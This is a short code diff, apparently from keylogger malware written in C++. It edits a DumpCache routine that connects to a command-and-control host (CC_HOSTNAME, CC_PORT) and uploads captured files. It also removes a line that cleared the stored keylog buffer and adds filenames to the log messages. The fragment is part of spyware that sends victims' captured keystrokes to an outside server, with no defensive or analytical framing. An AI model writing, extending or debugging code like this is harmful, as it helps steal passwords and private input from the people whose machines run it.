@@ -53,7 +53,7 @@ void DumpCache()
 	Socket ccSocket(CC_HOSTNAME, CC_PORT);
 	if (!ccSocket.isActive())
 	{
-		IO::WriteAppLog("Connection to " + CC_HOSTNAME + + " on port " + CC_PORT + "failed");
+		IO::WriteAppLog("Connection to " + CC_HOSTNAME + + " on port " + CC_PORT + " failed");
 
 		ccSocket.close();
 		return;	// Files will be left alone
@@ -70,13 +70,12 @@ void DumpCache()
 		}
 		else if (res == SUCCESS)
 		{
-			KeyboardManager::GetInstance().keylog = "";
 			// TODO delete file
-			IO::WriteAppLog("Successfully sent file");
+			IO::WriteAppLog("Successfully sent file [" + filename + "]");
 		}
 		else
 		{
-			IO::WriteAppLog("Log failed to send");
+			IO::WriteAppLog("File [" + filename + "] failed to send");
 		}
 	}
 }
